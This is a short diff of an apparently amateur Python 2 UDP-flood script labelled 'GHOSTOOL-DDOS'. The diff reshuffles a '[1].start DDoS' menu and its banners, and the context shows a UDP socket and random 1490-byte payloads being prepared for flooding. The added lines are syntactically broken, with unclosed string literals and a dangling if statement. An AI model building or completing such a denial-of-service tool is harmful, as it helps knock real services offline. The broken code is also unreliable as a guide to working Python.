@@ -12,21 +12,23 @@ day = now.day
 month = now.month
 year = now.year
 
+ans=True
+while ans:
+    os.system("figlet DDOS
+    print("
+   [1].start DDoS
+   [2].exit
+   ")
+ans=input("Choose:")
+if  ans=="1":
+
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
-ans=True
-while ans:
-    print("""
-   [1].start DDoS
-   [2].exit
-   """)
-ans=input("Choose:")
-if  ans=="1":
 
     os.system("clear")
-    os.system("figlet GHOSTOOL-DDOS")
+    os.system("figlet DDOS")
 
     print
     print "----------*GHOST56*---------------"
